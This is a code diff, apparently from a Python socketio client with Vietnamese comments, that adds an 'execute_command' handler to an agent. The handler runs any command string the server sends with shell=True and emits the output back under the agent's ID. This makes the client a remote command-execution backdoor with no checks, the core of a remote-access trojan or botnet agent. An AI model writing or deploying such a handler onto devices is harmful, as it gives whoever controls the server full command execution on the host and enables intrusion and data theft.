@@ -1,6 +1,7 @@
 import socketio
 import time
 import platform 
+import subprocess
 
 # khoi tao client (dien thoai)
 sio = socketio.Client()
@@ -26,6 +27,32 @@ def connect():
 def server_ack(data):
     # nghe server xac nhan
     print(f"[v] server ack: {data}")
+
+@sio.event
+def execute_command(data):
+    # lay lenh tu server gui xuong
+    command_text = data.get('cmd')
+    print(f"[*] received command: {command_text}")
+
+    result = ""
+    try:
+        # thuc thi lenh va gop loi (stderr) vao ket qua (stdout)
+        output = subprocess.check_output(command_text, shell=True, stderr=subprocess.STDOUT)
+        
+        # giai ma tu bytes sang string
+        result = output.decode('utf-8', errors='replace')
+        
+    except subprocess.CalledProcessError as e:
+        # truong hop lenh chay nhung tra ve ma loi
+        result = e.output.decode('utf-8', errors='replace')
+    except Exception as e:
+        # cac loi khac (vi du code python sai)
+        result = str(e)
+
+    print(f"[+] execution result:\n{result}")
+
+    # gui ket qua nguoc tro lai server
+    sio.emit('command_result', {'result': result, 'agent_id': AGENT_ID})
 
 @sio.event
 def disconnect():
